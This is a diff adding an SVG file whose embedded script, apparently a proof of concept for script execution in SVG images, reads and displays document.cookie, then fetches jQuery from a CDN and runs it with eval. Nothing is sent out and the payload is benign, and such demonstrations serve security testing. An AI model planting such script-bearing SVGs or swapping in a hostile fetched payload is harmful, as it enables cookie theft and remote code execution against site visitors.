@@ -1,0 +1,68 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="620" height="300" viewBox="0 0 620 300">
+  <rect width="620" height="300" rx="26" fill="#4285f4"/>
+  <text x="310" y="93" text-anchor="middle" fill="white"
+        font-family="Arial,sans-serif" font-size="64" font-weight="700">SFS</text>
+  <text id="status" x="310" y="148" text-anchor="middle" fill="white"
+        font-family="Arial,sans-serif" font-size="19">Loading jQuery...</text>
+  <text id="details" x="310" y="183" text-anchor="middle" fill="white"
+        font-family="Arial,sans-serif" font-size="14"></text>
+  <rect id="indicator" x="130" y="208" width="360" height="42" rx="12" fill="#ffffff" opacity="0.25"/>
+  <text id="indicator-text" x="310" y="235" text-anchor="middle" fill="white"
+        font-family="Arial,sans-serif" font-size="16">Waiting</text>
+  <script><![CDATA[
+    const url = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js?utm_source=chatgpt.com';
+    const status = document.getElementById('status');
+    const details = document.getElementById('details');
+    const indicatorText = document.getElementById('indicator-text');
+
+    (async () => {
+      let cookieResult;
+      try {
+        cookieResult = `document.cookie: ${document.cookie || '(empty)'}`;
+      } catch (error) {
+        cookieResult = `document.cookie blocked: ${error.name}`;
+      }
+      details.textContent = cookieResult;
+
+      try {
+        const response = await fetch(url);
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const source = await response.text();
+
+        (0, eval)(source);
+        if (!window.jQuery) throw new Error('jQuery was not installed');
+
+        const $ = window.jQuery;
+        $('#status').text(`jQuery ${$.fn.jquery} loaded and executed`);
+        $('#indicator').attr({ fill: '#16a34a', opacity: '1' });
+        $('#details').attr('fill', '#eaffea');
+
+        // Reveal or hide one character per frame, 20 frames/second.
+        const sentence = 'jQuery animation running..........';
+        const text = $('#indicator-text');
+        const minChars = 1;
+        const maxChars = sentence.length;
+        let chars = maxChars;
+        let direction = -1;
+
+        text.text(sentence);
+        setInterval(() => {
+          chars += direction;
+          if (chars <= minChars) {
+            chars = minChars;
+            direction = 1;
+          } else if (chars >= maxChars) {
+            chars = maxChars;
+            direction = -1;
+          }
+          text.text(sentence.slice(0, chars));
+        }, 50);
+      } catch (error) {
+        status.textContent = `PoC failed: ${error.message}`;
+        indicatorText.textContent = 'Fetch / execution failed';
+        document.getElementById('indicator').setAttribute('fill', '#b91c1c');
+        document.getElementById('indicator').setAttribute('opacity', '1');
+      }
+    })();
+  ]]></script>
+</svg>
